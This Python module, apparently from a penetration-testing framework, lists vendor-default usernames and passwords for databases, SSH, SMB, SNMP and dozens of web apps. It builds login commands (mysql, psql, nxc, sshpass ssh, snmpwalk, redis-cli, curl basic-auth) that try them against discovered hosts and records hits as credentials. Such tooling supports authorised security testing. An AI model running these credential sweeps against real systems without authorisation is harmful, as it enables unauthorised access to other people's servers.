"""Generalized default-credential sweep across detected services and web apps.

Everywhere breachload sees a *service* or a *fingerprinted web app*, there is a
short, high-signal list of vendor-default credentials worth trying before anything
expensive. This module is that list, keyed by service name / product token, and a
generator that emits the argv commands to try them - through the existing service
adapters where they exist, or a plain curl for web basic-auth logins.

Pure data + argv generation, no execution. The scope check + validator apply at
run time (the argv are runnable through the standard adapter path).
"""

from __future__ import annotations

from ..core.state import Credential, EngagementState

# service key (nmap/adapter name) -> list of (user, secret) defaults to try.
SERVICE_DEFAULTS: dict[str, list[tuple[str, str]]] = {
    "mysql": [("root", ""), ("root", "root"), ("root", "mysql")],
    "postgres": [("postgres", ""), ("postgres", "postgres")],
    "mssql": [("sa", ""), ("sa", "sa"), ("sa", "password")],
    "mongodb": [("admin", ""), ("root", "root")],
    "redis": [("", "")],                              # requirepass off
    "ftp": [("anonymous", "anonymous"), ("ftp", "ftp")],
    "ssh": [("root", "root"), ("root", "toor"), ("admin", "admin")],
    "vnc": [("", "password"), ("", "vnc")],
    "smb": [("guest", ""), ("Administrator", ""), ("admin", "admin")],
    "snmp": [("", "public"), ("", "private")],       # community
    "elasticsearch": [("elastic", "changeme"), ("elastic", "elastic")],
}

# Product / fingerprint token -> [(user, pass)] for common web-app logins.
WEBAPP_DEFAULTS: dict[str, list[tuple[str, str]]] = {
    "tomcat": [("tomcat", "tomcat"), ("admin", "admin"), ("manager", "manager")],
    "jenkins": [("admin", "admin"), ("jenkins", "jenkins")],
    "jboss": [("admin", "admin"), ("jboss", "jboss")],
    "weblogic": [("weblogic", "weblogic"), ("weblogic", "welcome1")],
    "grafana": [("admin", "admin")],
    "kibana": [("elastic", "changeme")],
    "gitea": [("gitea", "gitea"), ("admin", "admin")],
    "gitlab": [("root", "5iveL!fe"), ("root", "password")],
    "phpmyadmin": [("root", ""), ("root", "root")],
    "wordpress": [("admin", "admin"), ("admin", "password")],
    "joomla": [("admin", "admin")],
    "drupal": [("admin", "admin")],
    "cacti": [("admin", "admin")],
    "webmin": [("root", "root"), ("admin", "admin")],
    "zabbix": [("Admin", "zabbix")],
    "nagios": [("nagiosadmin", "nagiosadmin"), ("nagiosadmin", "PASSW0RD")],
    "ofbiz": [("admin", "ofbiz")],
    "glpi": [("glpi", "glpi"), ("post-only", "postonly"),
             ("tech", "tech"), ("normal", "normal")],
    "wso2": [("admin", "admin")],
    "roundcube": [("admin", "admin")],
    "teamcity": [("admin", "admin")],
    "coldfusion": [("admin", "admin")],
    "citrix": [("root", "C1trix321"), ("nsroot", "nsroot")],
    "openfire": [("admin", "admin")],
    "rocketchat": [("admin", "admin")],
    "keycloak": [("admin", "admin")],
    "harbor": [("admin", "Harbor12345")],
    "minio": [("minioadmin", "minioadmin")],
    "pfsense": [("admin", "pfsense")],
    "fortinet": [("admin", ""), ("admin", "admin")],
    "papercut": [("admin", "password")],
    "vcenter": [("root", "vmware"), ("administrator@vsphere.local", "vmware")],
    "sonicwall": [("admin", "password")],
    "printer": [("admin", ""), ("admin", "admin")],
    "router": [("admin", "admin"), ("root", "admin")],
}


def _fingerprint_haystack(svc) -> str:
    return " ".join([svc.name or "", svc.product or "",
                     svc.banner or "", *svc.notes]).lower()


def sweep_commands(state: EngagementState) -> list[tuple[str, str, list[str]]]:
    """For every relevant service, emit (host, technique, argv) test commands.

    A ``technique`` label ("mysql-blank-root", "wordpress-default-admin", ...)
    identifies the class. Argv uses the same tools the real adapters use, so a
    hit runs safely through the existing scope+validator layer.
    """
    out: list[tuple[str, str, list[str]]] = []
    for host in state.hosts.values():
        for svc in host.services.values():
            key = (svc.name or "").lower()
            hay = _fingerprint_haystack(svc)

            # Service-level defaults keyed on nmap service name.
            for skey, pairs in SERVICE_DEFAULTS.items():
                if skey in key or skey in hay:
                    for user, pw in pairs:
                        out.extend(_service_argv(host.address, svc, skey, user, pw))
                    break   # first match wins for a service

            # Web-app defaults keyed on any product/note token.
            if _is_http_like(svc):
                for token, pairs in WEBAPP_DEFAULTS.items():
                    if token in hay:
                        for user, pw in pairs:
                            out.append((host.address, f"{token}-default",
                                        _web_login_argv(host.address, svc, user, pw)))
    return out


def _service_argv(host, svc, skey, user, pw) -> list[tuple[str, str, list[str]]]:
    port = svc.port
    tech = f"{skey}-{'blank' if not pw else 'default'}"
    if skey == "mysql":
        argv = ["mysql", "-h", host, "-P", str(port), "-u", user,
                *(["-p" + pw] if pw else [""]), "-e", "SHOW DATABASES"]
        return [(host, tech, [a for a in argv if a != ""])]
    if skey == "postgres":
        argv = ["psql", "-h", host, "-p", str(port), "-U", user,
                "-w", "-c", "SELECT 1"]
        return [(host, tech, argv)]
    if skey == "mssql":
        argv = ["nxc", "mssql", host, "-u", user, "-p", pw, "--port", str(port)]
        return [(host, tech, argv)]
    if skey == "ftp":
        argv = ["curl", "-s", "--max-time", "10", f"ftp://{user}:{pw}@{host}:{port}/"]
        return [(host, tech, argv)]
    if skey == "ssh":
        argv = ["sshpass", "-p", pw, "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=6", "-p", str(port),
                f"{user}@{host}", "id"]
        return [(host, tech, argv)]
    if skey == "smb":
        argv = ["nxc", "smb", host, "-u", user, "-p", pw]
        return [(host, tech, argv)]
    if skey == "snmp":
        argv = ["snmpwalk", "-v2c", "-c", pw or "public", "-t", "3", "-r", "1",
                f"{host}:{port}"]
        return [(host, tech, argv)]
    if skey == "redis":
        argv = ["redis-cli", "-h", host, "-p", str(port), "info"]
        return [(host, tech, argv)]
    return []


def _web_login_argv(host, svc, user, pw) -> list[str]:
    from ..core.netutil import bracket
    scheme = "https" if svc.port in (443, 8443) else "http"
    url = f"{scheme}://{bracket(host)}:{svc.port}/"
    return ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
            "--max-time", "10", "-u", f"{user}:{pw}", url]


def _is_http_like(svc) -> bool:
    name = (svc.name or "").lower()
    return "http" in name or svc.port in (80, 443, 8080, 8000, 8443, 8888, 3000, 5000)


def credential_from_hit(user: str, secret: str, host: str, service_key: str,
                        technique: str) -> Credential:
    """Build a validated Credential record for a successful default-cred hit."""
    return Credential(service_key=f"{host}:{service_key}", username=user,
                      secret=secret, kind="password",
                      source=f"default-cred sweep ({technique})", validated=True)
